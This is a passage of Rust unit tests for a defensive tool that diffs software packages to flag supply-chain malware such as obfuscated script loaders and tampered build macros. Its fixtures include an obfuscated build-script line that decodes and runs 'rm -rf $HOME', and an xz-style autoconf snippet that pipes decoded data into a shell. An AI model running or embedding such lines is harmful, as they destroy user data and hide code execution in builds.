            }],
        };
        let complete = [
            "long-numeric-array-literal",
            "fromcharcode-call",
            "browser-create-script-element",
            "dynamic-script-element-load",
        ];
        assert!(obfuscated_remote_script_loader(&make_diff(&complete)));
        assert!(!external_remote_script_loader(&make_diff(&complete)));
        for omitted in &complete {
            let partial = complete
                .iter()
                .copied()
                .filter(|id| id != omitted)
                .collect::<Vec<_>>();
            assert!(!obfuscated_remote_script_loader(&make_diff(&partial)));
        }

        let literal = [
            "js-remote-host-url",
            "browser-create-script-element",
            "dynamic-script-element-load",
        ];
        assert!(external_remote_script_loader(&make_diff(&literal)));
        assert!(!obfuscated_remote_script_loader(&make_diff(&literal)));
        for omitted in &literal {
            let partial = literal
                .iter()
                .copied()
                .filter(|id| id != omitted)
                .collect::<Vec<_>>();
            assert!(!external_remote_script_loader(&make_diff(&partial)));
        }
    }

    #[test]
    fn terminal_claim_diff_omits_unchanged_root_identity_and_version() {
        let identity = |version: &str, organization: Option<&str>| filefacts::Identity {
            name: Some(filefacts::Claim::claimed("node-ipc", "test")),
            identifier: Some(filefacts::Claim::claimed("node-ipc", "test")),
            version: Some(filefacts::Claim::claimed(version, "test")),
            organization: organization.map(|value| filefacts::Claim::claimed(value, "test")),
            ..Default::default()
        };
        let old = identity("12.0.0", None);
        let new = identity("12.0.1", None);
        let old_fields = identity_claim_fields(&old, false);
        let new_fields = identity_claim_fields(&new, false);
        assert!(changed_identity_claims("<root>", &old_fields, &new_fields).is_empty());

        let changed = identity("12.0.1", Some("new publisher"));
        let changed_fields = identity_claim_fields(&changed, false);
        assert_eq!(
            changed_identity_claims("<root>", &new_fields, &changed_fields),
            vec!["<root>: + organization new publisher [claimed]"]
        );

        // A member version is still available when it is not duplicated by
        // the artifact masthead.
        let member_fields: BTreeMap<_, _> = identity_claim_fields(&new, true);
        assert_eq!(
            member_fields.get("version").map(String::as_str),
            Some("12.0.1 [claimed]")
        );
    }

    #[test]
    fn line_diff_marks_additions_removals_and_context() {
        // gentoo-shaped edit: one line replaced, one added; the rest is context.
        let old = b"#!/bin/bash\nexec meson build\n";
        let new = b"#!/bin/bash\nmeson=`base64 -d <<< L2Jpbi9ybQo=`\nexec ${meson} -rf $HOME\n";
        let d = line_diff(old, new);
        // Context line is unmarked; both new lines are `+`; the replaced old
        // line surfaces as `-`.
        assert!(d.contains("  #!/bin/bash"), "context line kept: {d}");
        assert!(
            d.contains("+ meson=`base64 -d <<< L2Jpbi9ybQo=`"),
            "added: {d}"
        );
        assert!(d.contains("+ exec ${meson} -rf $HOME"), "added: {d}");
        assert!(d.contains("- exec meson build"), "removed: {d}");
    }

    #[test]
    fn line_diff_neutralizes_control_chars() {
        // A crafted line can't smuggle a terminal escape into the payload.
        let d = line_diff(b"", b"evil\x1b[31mred\n");
        assert!(!d.contains('\x1b'), "escape must be neutralized: {d:?}");
    }

    #[test]
    fn capability_families_are_platform_neutral() {
        let mut families = HashSet::new();
        add_capability_text(
            &mut families,
            "CreateProcess WinHttpOpen BCryptEncrypt GetComputerName",
        );
        assert!(families.contains("process"));
        assert!(families.contains("communications"));
        assert!(families.contains("crypto"));
        assert!(families.contains("discovery"));
    }

    #[test]
    fn capability_bundle_requires_convergence_not_one_api() {
        let mut one_api = HashSet::new();
        one_api.insert("communications");
        let ordinary = CapabilityShape {
            families: one_api,
            executable: true,
            ..Default::default()
        };
        assert!(capability_shape_score(&ordinary, false, false) < 10);

        let mut bundle = HashSet::new();
        for family in [
            "communications",
            "process",
            "remote-access",
            "discovery",
            "crypto",
            "loading",
        ] {
            bundle.insert(family);
        }
        let suspicious = CapabilityShape {
            families: bundle,
            executable: true,
            resource_path: true,
            archive_member: true,
        };
        assert!(capability_shape_score(&suspicious, true, true) >= 10);
    }

    #[test]
    fn package_root_churn_does_not_hide_replacements() {
        assert_eq!(
            normalized_member_path(
                "<root>!!HandBrake-1.0.7/HandBrake.app/Contents/MacOS/HandBrake"
            ),
            "<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"
        );
        assert_eq!(
            normalized_member_path("<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"),
            "<root>!!HandBrake/HandBrake.app/Contents/MacOS/HandBrake"
        );
        assert_ne!(
            normalized_member_path("<root>!!foo-1.0/bin/tool"),
            normalized_member_path("<root>!!bar-1.0/bin/tool")
        );
        assert_eq!(normalized_member_path("src/main.c"), "src/main.c");
        assert_eq!(
            normalized_member_path("<root>!!outer-1.0/plugins/payload.zip!!inner-2.0/bin/run"),
            "<root>!!outer/plugins/payload.zip!!inner/bin/run"
        );
        assert_eq!(
            normalized_member_path("<root>!!bfunky-http-parser-0cdd2ea/src/Parser.php"),
            "<root>!!bfunky-http-parser/src/Parser.php"
        );
        assert_eq!(
            normalized_member_path("<root>!!bfunky-http-parser-0e52069/src/Parser.php"),
            "<root>!!bfunky-http-parser/src/Parser.php"
        );
        assert_eq!(
            normalized_member_path("<root>!!release-1234567/src/Parser.php"),
            "<root>!!release-1234567/src/Parser.php"
        );
    }

    #[test]
    fn versioned_member_roots_are_merged_before_judging() {
        let trait_change = |id: &str| TraitChange {
            id: id.to_string(),
            trait_section: "micro-behaviors".to_string(),
            crit: Criticality::Notable,
            conf: 1.0,
            desc: "same trait".to_string(),
            count: 1,
        };
        let old = FileDiffEntry {
            path: "<root>!!widget-1.0.0/lib/a.php".to_string(),
            file_type: Some("php".to_string()),
            status: FileStatus::Removed,
            identity: None,
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    removed: vec![trait_change("micro-behaviors/example::same")],
                    old_count: 1,
                    old_weight: 1.0,
                    change_weight: 1.0,
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let new = FileDiffEntry {
            path: "<root>!!widget-1.0.1/lib/a.php".to_string(),
            file_type: Some("php".to_string()),
            status: FileStatus::Added,
            identity: None,
            scopes: ScopeDiffs {
                traits: Some(ScopeDiff {
                    added: vec![trait_change("micro-behaviors/example::same")],
                    new_count: 1,
                    new_weight: 1.0,
                    change_weight: 1.0,
                    ..Default::default()
                }),
                ..Default::default()
            },
            old_formula: None,
            new_formula: None,
        };
        let raw = DiffReportV1 {
            old_root: "old.zip".to_string(),
            new_root: "new.zip".to_string(),
            summary: Default::default(),
            scopes: Default::default(),
            files: vec![old, new],
        };
        let judged = normalized_archive_diff(&raw);
        assert_eq!(judged.files.len(), 1);
        assert_eq!(judged.files[0].status, FileStatus::Unchanged);
        let traits = judged.files[0].scopes.traits.as_ref().unwrap();
        assert!(traits.added.is_empty());
        assert!(traits.removed.is_empty());
        assert!(traits.changed.is_empty());
    }

    #[test]
    fn npm_package_root_pairs_with_versioned_source_snapshot() {
        let old = FileDiffEntry {
            path: "<root>!!flatmap-stream-0.1.0/index.min.js".to_string(),
            file_type: Some("javascript".to_string()),
            status: FileStatus::Removed,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: Some("clean".to_string()),
            new_formula: None,
        };
        let new = FileDiffEntry {
            path: "<root>!!package/index.min.js".to_string(),
            file_type: Some("javascript".to_string()),
            status: FileStatus::Added,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: None,
            new_formula: Some("payload".to_string()),
        };
        let raw = DiffReportV1 {
            old_root: "flatmap-stream-0.1.0-github.tar.gz".to_string(),
            new_root: "flatmap-stream-0.1.1.tgz".to_string(),
            summary: Default::default(),
            scopes: Default::default(),
            files: vec![old, new],
        };
        let judged = normalized_archive_diff(&raw);
        assert_eq!(judged.files.len(), 1);
        assert_eq!(judged.files[0].path, "<root>!!package/index.min.js");
        assert_eq!(judged.files[0].old_formula.as_deref(), Some("clean"));
        assert_eq!(judged.files[0].new_formula.as_deref(), Some("payload"));
    }

    #[test]
    fn npm_snapshot_key_distinguishes_package_root() {
        assert_eq!(
            npm_snapshot_member_key("<root>!!foo-1.0/bin/tool"),
            Some((false, "bin/tool".to_string()))
        );
        assert_eq!(
            npm_snapshot_member_key("<root>!!package/bin/tool"),
            Some((true, "bin/tool".to_string()))
        );
        assert_eq!(npm_snapshot_member_key("<root>!!foo/bin/tool"), None);
    }

    #[test]
    fn python_sdist_src_pairs_with_flat_wheel_package() {
        let old = FileDiffEntry {
            path: "<root>!!telnyx/_client.py".to_string(),
            file_type: Some("python".to_string()),
            status: FileStatus::Removed,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: Some("clean".to_string()),
            new_formula: None,
        };
        let new = FileDiffEntry {
            path: "<root>!!telnyx-4.87.1/src/telnyx/_client.py".to_string(),
            file_type: Some("python".to_string()),
            status: FileStatus::Added,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: None,
            new_formula: Some("payload".to_string()),
        };
        let raw = DiffReportV1 {
            old_root: "telnyx-4.87.0-py3-none-any.whl".to_string(),
            new_root: "telnyx-4.87.1.tar.gz".to_string(),
            summary: Default::default(),
            scopes: Default::default(),
            files: vec![old, new],
        };
        let judged = normalized_archive_diff(&raw);
        assert_eq!(judged.files.len(), 1);
        // The synthetic entries carry no scope deltas, so the merged status is
        // unchanged; the formulas prove the two archive members were paired.
        assert_eq!(judged.files[0].status, FileStatus::Unchanged);
        assert_eq!(judged.files[0].old_formula.as_deref(), Some("clean"));
        assert_eq!(judged.files[0].new_formula.as_deref(), Some("payload"));

        assert_eq!(
            python_distribution_member_key("<root>!!telnyx-4.87.1/src/telnyx/_client.py"),
            Some((true, "telnyx/_client.py".to_string()))
        );
        assert_eq!(
            python_distribution_member_key("<root>!!telnyx/_client.py"),
            Some((false, "telnyx/_client.py".to_string()))
        );
        assert_eq!(
            python_distribution_member_key("<root>!!telnyx-4.87.0.dist-info/METADATA"),
            None
        );
    }

    #[test]
    fn payload_selection_uses_content_type_before_names() {
        assert!(is_compiled_binary_file_type(filefacts::FileType::MachO));
        assert!(!is_compiled_binary_file_type(filefacts::FileType::Php));
        assert!(!is_compiled_binary_file_type(filefacts::FileType::Data));
        assert!(!executable_member_layout("pkg!!cache/payload.bin"));
        assert!(executable_member_layout(
            "pkg!!App.app/Contents/MacOS/launch"
        ));
    }

    #[test]
    fn source_build_macro_signal_requires_joined_execution_clues() {
        let malicious = b"AC_CONFIG_COMMANDS([build-to-host], [eval $stage | $SHELL])\ncarrier=`grep -aErls marker $srcdir/`\nconfig='sed r $carrier | eval $map | $decoder -d'\nmap='tr abc xyz'";
        let ordinary = b"AC_DEFUN([gl_BUILD_TO_HOST], [AC_SUBST([$1_c_make])])\nvalue=`echo ok`";
        assert!(source_build_macro_score(malicious));
        assert!(!source_build_macro_score(ordinary));
    }

    #[test]
    fn changed_test_carrier_requires_compression_and_test_context() {
        let entry = |path: &str, status| FileDiffEntry {
            path: path.to_string(),
            file_type: None,
            status,
            identity: None,
            scopes: ScopeDiffs::default(),
            old_formula: None,
            new_formula: None,
        };
        assert!(changed_test_carrier(&entry(
            "<root>!!pkg-2/tests/files/carrier.lzma",
            FileStatus::Changed,
        )));
        assert!(!changed_test_carrier(&entry(
            "<root>!!pkg-2/tests/files/carrier.lzma",
            FileStatus::Unchanged,
        )));
        assert!(!changed_test_carrier(&entry(
            "<root>!!pkg-2/assets/carrier.lzma",
            FileStatus::Changed,
        )));
        assert!(!changed_test_carrier(&entry(
            "<root>!!pkg-2/tests/files/README",
            FileStatus::Changed,
        )));
    }

    #[test]
    fn source_archive_detection_is_limited_to_tarball_forms() {
        assert!(is_source_archive(std::path::Path::new("xz-5.6.0.tar.xz")));
        assert!(is_source_archive(std::path::Path::new("pkg.tar.gz")));
        assert!(!is_source_archive(std::path::Path::new("pkg.tgz")));
        assert!(!is_source_archive(std::path::Path::new("source-tree")));
    }
}
